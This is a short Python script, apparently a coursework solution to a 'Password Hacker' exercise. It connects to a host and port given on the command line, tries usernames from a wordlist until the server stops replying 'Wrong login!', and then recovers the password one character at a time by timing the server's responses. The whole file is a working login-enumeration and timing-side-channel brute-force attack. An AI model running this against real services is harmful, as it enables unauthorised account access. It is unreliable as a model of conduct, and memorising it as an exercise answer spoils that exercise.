#Project written by Felix Otto Trihardjo
from sys import argv, exit
from socket import socket
from itertools import product
from datetime import datetime
from json import dumps, loads
with socket() as socket, open(r'C:\Users\user\IdeaProjects\Password Hacker\Password Hacker\task\hacking\logins.txt') as logins:
    socket.connect((argv[1],int(argv[2])))
    for admin in map(lambda line: line.strip(),logins.readlines()):
        socket.send(dumps({'login':admin,'password':' '}).encode())
        response = loads(socket.recv(1024).decode())
        if response['result'] != 'Wrong login!':
            login = admin
            break
    password = ''
    while True:
        for c in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890':
            information = dumps({'login':login,'password':password+c})
            socket.send(information.encode())
            start = datetime.now()
            response = loads(socket.recv(1024).decode())
            time = datetime.now()-start
            if response['result'] == 'Connection success!':
                print(information)
                exit(0)
            if time.microseconds >= 90000:
                password += c